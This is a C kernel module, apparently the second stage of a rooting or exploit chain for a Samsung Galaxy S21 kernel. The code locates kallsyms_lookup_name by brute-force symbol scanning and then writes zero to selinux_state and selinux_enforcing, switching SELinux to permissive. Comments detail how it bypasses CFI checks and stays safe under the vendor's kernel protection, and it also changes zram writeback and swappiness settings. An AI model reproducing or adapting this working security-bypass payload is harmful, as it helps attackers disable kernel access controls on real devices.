/* df_self: self-contained second stage for SM-G991B/HZC2 (5.4.242).
 *
 * No anchor, no slide input, no kprobe/UMH/filp imports, no text decode:
 *  1. Brute-force scan [KLN_FILE-1MB, KLN_FILE+16MB) for
 *     "kallsyms_lookup_name+0x0/" via sprint_symbol (KASLR slides observed
 *     all <2MB; window covers far beyond).
 *  2. kln("selinux_state") -> write 0 (data access, CFI-free).
 *  3. kln("selinux_enforcing") -> write 0 (the global int HZC2 reads).
 *  4. UMH REMOVED (v72): bare calls pass CFI (proven: resolve+rc=0)
 *     but STATIC_USERMODEHELPER="" turns every helper into a
 *     successful no-op (kernel source confirms). Dead weight cut
 *     (also shrinks splice blocks = fewer stray-write dice rolls).
 *  5. Always return 0 (HZC2 unload-after-error hangs).
 *
 * Imports: printk + sprint_symbol (both device-proven) + memset/param_ops
 * (core-ubiquitous). Fresh eyes each boot: no state carried.
 */
#include <linux/errno.h>
#include <linux/err.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IonStack_S21");
MODULE_DESCRIPTION("self-contained second stage (HZC2)");

extern int sprint_symbol(char *buffer, unsigned long address);

static char *soft_reboot;
module_param(soft_reboot, charp, 0400);

typedef unsigned long (*kln_t)(const char *name);

/* Exact-type file-op pointers (CFI lessons: df_final.c:94 int-vs-umode_t
 * panic; v82c filp_open panic — forward-declared `struct file` hashes
 * differently from the complete type. Full fs.h: complete types only.
 * Prototypes verified against 5.4.242 fs.h:2623/2633/3093. */
#include <linux/fs.h>
typedef struct file *(*fopen_t)(const char *filename, int flags, umode_t mode);
typedef ssize_t (*kwrite_t)(struct file *file, const void *buf, size_t count,
			    loff_t *pos);
typedef int (*fclose_t)(struct file *filp, void *id);

/* v82d: NO helper functions taking function pointers (v82b lesson: calls
 * through POINTER PARAMS emit __cfi_slowpath, which traps on kallsyms-
 * resolved addresses even with exact types — RCNT 147/148 CFI panics.
 * Calls through LOCALS use the inline icall check, which passes (v82
 * proven: wb-close worked). So: verbose inline duplicates, pointers
 * never leave dfs_init's frame. Ugly is load-bearing. */

/* file baseline (vmlinux.elf): kallsyms_lookup_name @ 0xffffffc0102f860c */
#define KLN_FILE	0xffffffc0102f860cUL
#define SCAN_DOWN	(1UL << 20)
#define SCAN_UP		(16UL << 20)
#define SCAN_STRIDE	4UL

static int name_is(const char *buf, const char *want)
{
	int i;

	for (i = 0; want[i]; i++) {
		if (buf[i] != want[i])
			return 0;
	}
	return buf[i] == '+' && buf[i + 1] == '0' && buf[i + 2] == 'x' &&
	       buf[i + 3] == '0' && buf[i + 4] == '/';
}

static int __init dfs_init(void)
{
	static char buf[256];
	unsigned long base = KLN_FILE - SCAN_DOWN;
	unsigned long end = KLN_FILE + SCAN_UP;
	unsigned long a, found = 0, sstate;
	unsigned long j;
	kln_t kln;

	for (a = base; a < end; a += SCAN_STRIDE) {
		for (j = 0; j < sizeof(buf); j++)
			buf[j] = 0;
		sprint_symbol(buf, a);
		if (name_is(buf, "kallsyms_lookup_name")) {
			found = a;
			break;
		}
	}
	if (!found)
		goto done;
	kln = (kln_t)found;
	sstate = kln("selinux_state");
	if (!sstate)
		goto done;
	/* HZC2 layout (DEVELOP=y): disabled[0], enforcing[1]. */
	*(volatile unsigned char *)(sstate + 1) = 0;
	/* HZC2 enforcement + enforce-file BOTH read the GLOBAL int
	 * selinux_enforcing (not the struct field): clear it too. */
	{
		unsigned long genf = kln("selinux_enforcing");
		if (genf)
			*(volatile int *)genf = 0;
	}
	__asm__ volatile("dsb sy" ::: "memory");
	pr_info("dfs: permissive set\n");
	/* v82: close zram writeback (minefield mitigation, zero text writes
	 * -> RKP-safe). zram_wb_available() returns false while
	 * (wb_limit_enable && !bd_wb_limit): writing "0" to writeback_limit
	 * stops NEW writebacks, so zram_handle_comp_page (+0x66c BUG, marker
	 * BUG, panic("zram decomp failed")) never runs for fresh pages.
	 * Honest limit: pages ALREADY on bdev stay mines; OOM-killer replaces
	 * disk-overflow (userspace deaths, system lives). /dev/dfWB proves
	 * the sysfs path worked (app-pollable).
	 * v82b: also try zram1 (single-device assumption removed) and set
	 * swappiness=0 (no NEW swapout -> no new bdev writes at all, belt
	 * and suspenders with wb-close; old mines still readable risk). */
	{
		fopen_t o_fopen = (fopen_t)kln("filp_open");
		kwrite_t o_kwrite = (kwrite_t)kln("kernel_write");
		fclose_t o_fclose = (fclose_t)kln("filp_close");
		struct file *f;
		loff_t pos = 0;
		int wb0 = 0;

		if (!o_fopen || !o_kwrite || !o_fclose)
			goto done;
		f = o_fopen("/sys/block/zram0/writeback_limit",
			    1 /* O_WRONLY */, 0);
		if (!IS_ERR(f)) {
			o_kwrite(f, "0", 1, &pos);
			o_fclose(f, NULL);
			wb0 = 1;
		}
		pos = 0;
		f = o_fopen("/sys/block/zram1/writeback_limit",
			    1 /* O_WRONLY */, 0);
		if (!IS_ERR(f)) {
			o_kwrite(f, "0", 1, &pos);
			o_fclose(f, NULL);
		}
		pos = 0;
		f = o_fopen("/proc/sys/vm/swappiness", 1 /* O_WRONLY */, 0);
		if (!IS_ERR(f)) {
			o_kwrite(f, "0", 1, &pos);
			o_fclose(f, NULL);
			pr_info("dfs: swappiness 0\n");
		}
		if (wb0) {
			f = o_fopen("/dev/dfWB", 1 | 0100 /*W|CREAT*/, 0420);
			if (!IS_ERR(f))
				o_fclose(f, NULL);
			pr_info("dfs: wb closed\n");
		}
	}
	done:
	return 0;
}

module_init(dfs_init);
